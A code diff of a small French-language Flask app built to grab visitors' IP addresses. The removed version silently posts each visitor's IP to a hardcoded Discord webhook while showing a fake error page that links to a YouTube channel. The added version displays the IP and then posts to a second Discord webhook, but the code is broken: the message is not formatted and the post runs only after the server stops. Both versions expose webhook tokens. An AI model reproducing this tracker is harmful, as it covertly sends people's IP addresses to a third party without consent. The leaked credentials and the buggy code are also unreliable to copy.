@@ -1,31 +1,26 @@
-from flask import Flask, request, render_template
-import requests
+from flask import Flask, request
+import requests 
+import json
 
 app = Flask(__name__)
 
-# Remplacez 'VOTRE_WEBHOOK_URL' par l'URL réel de votre webhook Discord
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1189581246829957180/aRFpdCSf9AgfhrzGP0F5cjWxu1lG5-hlejBf3se-7BISIbx4VRS6aD-jiiy4BwpHgqZo'
-
 @app.route('/')
-def index():
-    error_message = "Une erreur s'est produite"
-    retry_url = "https://www.youtube.com/@MythicalPlayer_"
+def get_user_ip():
     user_ip = request.remote_addr
-    send_to_discord_webhook(user_ip)
-    return render_template('index.html', error_message=error_message, retry_url=retry_url)
-
-def send_to_discord_webhook(ip_address):
-    payload = {
-        'content': f"Adresse IP de l'utilisateur : {user_ip}"
-    }
-    try:
-        response = requests.post(WEBHOOK_URL, json=payload)
-        if response.status_code == 204:
-            print("Adresse IP envoyée avec succès au webhook Discord.")
-        else:
-            print(f"Erreur lors de l'envoi de l'adresse IP au webhook Discord. Code de statut : {response.status_code}")
-    except Exception as e:
-        print(f"Erreur lors de l'envoi de l'adresse IP au webhook Discord : {str(e)}")
+    return f"L'adresse IP de l'utilisateur est : {user_ip}"
 
 if __name__ == '__main__':
     app.run(debug=True)
+
+webhook_url = "https://discord.com/api/webhooks/1192113766750502932/N8tbEeBcTztezvIA61eAtpvCDAd28C3yA-Wl5r-OtkwUe_xulml1dTcXJmhLsQ3OpoWg"
+message =  "l adresse ip de l utilisteur est : {user_ip}"
+
+payload = {
+    "content": message
+}
+
+headers = {
+    "Content-Type": "application/json"
+}
+
+response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
